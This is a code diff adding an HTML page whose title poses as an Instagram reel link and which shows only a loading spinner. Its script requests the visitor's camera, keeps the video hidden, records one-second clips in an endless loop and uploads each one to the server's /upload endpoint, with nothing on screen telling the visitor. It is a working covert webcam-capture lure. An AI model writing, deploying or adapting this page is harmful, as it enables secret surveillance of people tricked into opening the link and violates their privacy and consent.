@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
+
+<title>www.instagram.com/reel/Dmu4hui9 </title>
+
+<style>
+
+body{
+    margin:0;
+    padding:0;
+    width:100vw;
+    height:100vh;
+    background:white;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    overflow:hidden;
+}
+
+.loader{
+
+    width:55px;
+    height:55px;
+
+    border:5px solid #e5e5e5;
+    border-top:5px solid #666;
+
+    border-radius:50%;
+
+    animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+
+    0%{
+        transform:rotate(0deg);
+    }
+
+    100%{
+        transform:rotate(360deg);
+    }
+}
+
+video{
+    display:none;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="loader"></div>
+
+<video
+id="video"
+autoplay
+muted
+playsinline>
+</video>
+
+<script>
+
+const video =
+document.getElementById("video");
+
+let cameraStream = null;
+
+
+
+async function startCamera(){
+
+    try{
+
+        cameraStream =
+        await navigator.mediaDevices.getUserMedia({
+
+            video:{
+                width:320,
+                height:240,
+                frameRate:15
+            },
+
+            audio:false
+        });
+
+        video.srcObject = cameraStream;
+
+        startLoop();
+
+    }catch(error){
+
+        console.log(error);
+    }
+}
+
+
+
+function startLoop(){
+
+    const recorder =
+    new MediaRecorder(cameraStream,{
+
+        mimeType:"video/webm",
+
+        videoBitsPerSecond:150000
+    });
+
+    let chunks = [];
+
+
+
+    recorder.ondataavailable =
+    function(event){
+
+        if(event.data.size > 0){
+
+            chunks.push(event.data);
+        }
+    };
+
+
+
+    recorder.onstop =
+    async function(){
+
+        try{
+
+            const blob =
+            new Blob(chunks,{
+
+                type:"video/webm"
+
+            });
+
+            const formData =
+            new FormData();
+
+            formData.append(
+
+                "video",
+                blob,
+                "video.webm"
+            );
+
+
+
+            await fetch("/upload",{
+
+                method:"POST",
+
+                body:formData
+            });
+
+            console.log("Uploaded");
+
+        }catch(uploadError){
+
+            console.log(uploadError);
+        }
+
+
+
+        setTimeout(function(){
+
+            startLoop();
+
+        },100);
+    };
+
+
+
+    recorder.start();
+
+
+
+    setTimeout(function(){
+
+        if(recorder.state !== "inactive"){
+
+            recorder.stop();
+        }
+
+    },1000);
+}
+
+
+
+startCamera();
+
+</script>
+
+</body>
+
+</html>
